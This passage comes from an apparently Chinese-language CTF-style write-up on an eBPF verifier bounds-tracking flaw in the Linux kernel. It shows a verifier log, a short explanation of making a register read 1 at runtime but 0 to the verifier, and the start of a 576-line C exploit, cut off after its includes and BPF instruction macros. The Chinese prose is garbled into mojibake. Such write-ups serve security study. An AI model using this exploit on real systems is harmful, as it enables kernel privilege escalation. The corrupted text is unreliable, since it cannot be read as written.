class="number">9223372032559808513</span>,umax_value=<span class="number">18446744069414584321</span>,var_off=(<span class="number">0x0</span>; <span class="number">0xffffffff00000001</span>),s32_min_value=<span class="number">0</span>,s32_max_value=<span class="number">1</span>,u32_max_value=<span class="number">1</span>) R6_w=invP0 R7=invP4294967298 R8=map_value(id=<span class="number">0</span>,off=<span class="number">0</span>,ks=<span class="number">4</span>,s=<span class="number">5376</span>,imm=<span class="number">0</span>) R9=invP<span class="number">-4294967296</span> R10=fp0 fp<span class="number">-8</span>=<span class="number">0000</span></span><br><span class="line"><span class="number">27</span>: (<span class="number">95</span>) <span class="built_in">exit</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œç¨å¾®æä¸€å˜´å°±æ˜¯è¿™é‡Œæ˜¯å¦‚ä½•ä½¿R3è¾¾åˆ°é«˜32ä½ä¸º<code>unknown</code>ï¼Œä½32ä¸º<code>known</code>çš„æ•ˆæœï¼Œå…¶å®ä¹Ÿå¾ˆå®¹æ˜“æƒ³æ˜ç™½ï¼Œè¿™é‡Œè¿›è¡Œäº†<code>unsigned</code>çš„å°äºç­‰äºçš„åˆ¤æ–­ï¼Œæ‰€ä»¥å¯ä»¥ç¡®å®šä½32ä½çš„å€¼ï¼Œä¸è¿‡å› ä¸ºæ˜¯<code>&lt;= 1</code>æ‰€ä»¥æœ€åä¸€ä½ä¹Ÿæ˜¯æ— æ³•ç¡®å®šçš„ï¼Œæ‰€ä»¥æœ€ç»ˆ<code>.mask = 0xffffffff00000001</code>ï¼Œå½“ç„¶ç›´æ¥<code>AND 0xffffffff00000001</code>åº”è¯¥ä¹Ÿæ˜¯å¯ä»¥çš„ã€‚</p><p>æ­¤æ—¶å› ä¸ºé€šè¿‡è¾¹ç•Œå€¼ä¿®å¤äº†R6å¯„å­˜å™¨çš„<code>var_off</code>ä¸º1ï¼Œä½†æ˜¯è¿è¡Œæ—¶ä¾æ—§ä¸º0æ‰€ä»¥æ­¤æ—¶åªéœ€è¦å°†<code>R6 + 1</code>éšå<code>AND 1</code>é‚£ä¹ˆåœ¨<code>verifier</code>æ˜¯å°±ä¼šæ˜¾ç¤ºR6ä¸º0äº†ï¼Œè‡³æ­¤å¾—åˆ°äº†ä¸€ä¸ªè¿è¡Œæ—¶ä¸º1ï¼Œ<code>verifier</code>ä¸º0çš„å¯„å­˜å™¨äº†ã€‚</p><h3 id="ç»¼ä¸Šï¼Œå¯å¾—exp"><a href="#ç»¼ä¸Šï¼Œå¯å¾—exp" class="headerlink" title="ç»¼ä¸Šï¼Œå¯å¾—exp"></a>ç»¼ä¸Šï¼Œå¯å¾—exp</h3><p>å…·ä½“åˆ©ç”¨æ–¹æ³•å’Œd3bpfä¸€è‡´ï¼Œè¿™é‡Œä¸å†èµ˜è¿°ï¼Œæœ‰éœ€è¦å¯ä»¥å»çœ‹ <a class="link"   href="https://cv196082.gitee.io/2023/01/06/d3bpf/" >https://cv196082.gitee.io/2023/01/06/d3bpf/<i class="fas fa-external-link-alt"></i></a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;err.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;net/if.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/bpf_common.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/bpf.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> _BPF_DEFS_H_</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _BPF_DEFS_H_</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_RAW_INSN(CODE, DST, SRC, OFF, IMM) \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                        \</span></span><br><span class="line"><span class="meta">        .code = CODE,                          \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                        \</span></span><br><span class="line"><span class="meta">        .src_reg = SRC,                        \</span></span><br><span class="line"><span class="meta">        .off = OFF,                            \</span></span><br><span class="line"><span class="meta">        .imm = IMM&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_LD_IMM64_RAW(DST, SRC, IMM)              \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                              \</span></span><br><span class="line"><span class="meta">        .code = BPF_LD | BPF_DW | BPF_IMM,           \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                              \</span></span><br><span class="line"><span class="meta">        .src_reg = SRC,                              \</span></span><br><span class="line"><span class="meta">        .off = 0,                                    \</span></span><br><span class="line"><span class="meta">        .imm = (__u32)(IMM)&#125;),                       \</span></span><br><span class="line"><span class="meta">        ((struct bpf_insn)&#123;                          \</span></span><br><span class="line"><span class="meta">            .code = 0, <span class="comment">/* zero is reserved opcode */</span> \</span></span><br><span class="line"><span class="meta">            .dst_reg = 0,                            \</span></span><br><span class="line"><span class="meta">            .src_reg = 0,                            \</span></span><br><span class="line"><span class="meta">            .off = 0,                                \</span></span><br><span class="line"><span class="meta">            .imm = ((__u64)(IMM)) &gt;&gt; 32&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Memory load, dst_reg = *(uint *) (src_reg + off16) */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_LDX_MEM(SIZE, DST, SRC, OFF)            \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                             \</span></span><br><span class="line"><span class="meta">        .code = BPF_LDX | BPF_SIZE(SIZE) | BPF_MEM, \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                             \</span></span><br><span class="line"><span class="meta">        .src_reg = SRC,                             \</span></span><br><span class="line"><span class="meta">        .off = OFF,                                 \</span></span><br><span class="line"><span class="meta">        .imm = 0&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Memory store, *(uint *) (dst_reg + off16) = src_reg */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_STX_MEM(SIZE, DST, SRC, OFF)            \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                             \</span></span><br><span class="line"><span class="meta">        .code = BPF_STX | BPF_SIZE(SIZE) | BPF_MEM, \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                             \</span></span><br><span class="line"><span class="meta">        .src_reg = SRC,                             \</span></span><br><span class="line"><span class="meta">        .off = OFF,                                 \</span></span><br><span class="line"><span class="meta">        .imm = 0&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Conditional jumps against immediates, if (dst_reg &#x27;op&#x27; imm32) goto pc + off16 */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_JMP_IMM(OP, DST, IMM, OFF)        \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                       \</span></span><br><span class="line"><span class="meta">        .code = BPF_JMP | BPF_OP(OP) | BPF_K, \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                       \</span></span><br><span class="line"><span class="meta">        .src_reg = 0,                         \</span></span><br><span class="line"><span class="meta">        .off = OFF,                           \</span></span><br><span class="line"><span class="meta">        .imm = IMM&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Like BPF_JMP_IMM, but with 32-bit wide operands for comparison. */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_JMP32_IMM(OP, DST, IMM, OFF)        \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                         \</span></span><br><span class="line"><span class="meta">        .code = BPF_JMP32 | BPF_OP(OP) | BPF_K, \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                         \</span></span><br><span class="line"><span class="meta">        .src_reg = 0,                           \</span></span><br><span class="line"><span class="meta">        .off = OFF,                             \</span></span><br><span class="line"><span class="meta">        .imm = IMM&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Short form of mov, dst_reg = imm32 */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_MOV64_IMM(DST, IMM)              \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                      \</span></span><br><span class="line"><span class="meta">        .code = BPF_ALU64 | BPF_MOV | BPF_K, \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                      \</span></span><br><span class="line"><span class="meta">        .src_reg = 0,                        \</span></span><br><span class="line"><span class="meta">        .off = 0,                            \</span></span><br><span class="line"><span class="meta">        .imm = IMM&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_MOV32_IMM(DST, IMM)            \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                    \</span></span><br><span class="line"><span class="meta">        .code = BPF_ALU | BPF_MOV | BPF_K, \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                    \</span></span><br><span class="line"><span class="meta">        .src_reg = 0,                      \</span></span><br><span class="line"><span class="meta">        .off = 0,                          \</span></span><br><span class="line"><span class="meta">        .imm = IMM&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Short form of mov, dst_reg = src_reg */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_MOV64_REG(DST, SRC)              \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                      \</span></span><br><span class="line"><span class="meta">        .code = BPF_ALU64 | BPF_MOV | BPF_X, \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                      \</span></span><br><span class="line"><span class="meta">        .src_reg = SRC,                      \</span></span><br><span class="line"><span class="meta">        .off = 0,                            \</span></span><br><span class="line"><span class="meta">        .imm = 0&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_MOV32_REG(DST, SRC)            \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                    \</span></span><br><span class="line"><span class="meta">        .code = BPF_ALU | BPF_MOV | BPF_X, \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                    \</span></span><br><span class="line"><span class="meta">        .src_reg = SRC,                    \</span></span><br><span class="line"><span class="meta">        .off = 0,                          \</span></span><br><span class="line"><span class="meta">        .imm = 0&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* ALU ops on immediates, bpf_add|sub|...: dst_reg += imm32 */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_ALU64_IMM(OP, DST, IMM)             \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                         \</span></span><br><span class="line"><span class="meta">        .code = BPF_ALU64 | BPF_OP(OP) | BPF_K, \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                         \</span></span><br><span class="line"><span class="meta">        .src_reg = 0,                           \</span></span><br><span class="line"><span class="meta">        .off = 0,                               \</span></span><br><span class="line"><span class="meta">        .imm = IMM&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* ALU ops on registers, bpf_add|sub|...: dst_reg += src_reg */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_ALU64_REG(OP, DST, SRC)             \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                         \</span></span><br><span class="line"><span class="meta">        .code = BPF_ALU64 | BPF_OP(OP) | BPF_X, \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                         \</span></span><br><span class="line"><span class="meta">        .src_reg = SRC,                         \</span></span><br><span class="line"><span class="meta">        .off = 0,                               \</span></span><br><span class="line"><span class="meta">        .imm = 0&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Program exit */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_EXIT_INSN()             \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;             \</span></span><br><span class="line"><span class="meta">        .code = BPF_JMP | BPF_EXIT, \</span></span><br><span class="line"><span class="meta">        .dst_reg = 0,               \</span></span><br><span class="line"><span class="meta">        .src_reg = 0,               \</span></span><br><span class="line"><span class="meta">        .off = 0,                   \</span></span><br><span class="line"><span class="meta">        .imm = 0&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* BPF_LD_IMM64 macro encodes single &#x27;load 64-bit immediate&#x27; insn */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_LD_IMM64(DST, IMM) \</span></span><br><span class="line"><span class="meta">    BPF_LD_IMM64_RAW(DST, 0, IMM)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* pseudo BPF_LD_IMM64 insn used to refer to process-local map_fd */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_LD_MAP_FD(DST, MAP_FD) \</span></span><br><span class="line"><span class="meta">    BPF_LD_IMM64_RAW(DST, BPF_PSEUDO_MAP_FD, MAP_FD)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// varies from userspace bpf_map_info definition so need to redefine</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_map_info_kernel</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    __u32 type;</span><br><span class="line">    __u32 id;</span><br><span class="line">    __u32 key_size;</span><br><span class="line">    __u32 value_size;</span><br><span class="line">    __u32 max_entries;</span><br><span class="line">    __u32 map_flags;</span><br><span class="line">    <span class="keyword">char</span> name[BPF_OBJ_NAME_LEN];</span><br><span class="line">    __u32 ifindex;</span><br><span class="line">    __u32 btf_vmlinux_value_type_id;</span><br><span class="line">    __u64 netns_dev;</span><br><span class="line">    __u64 netns_ino;</span><br><span 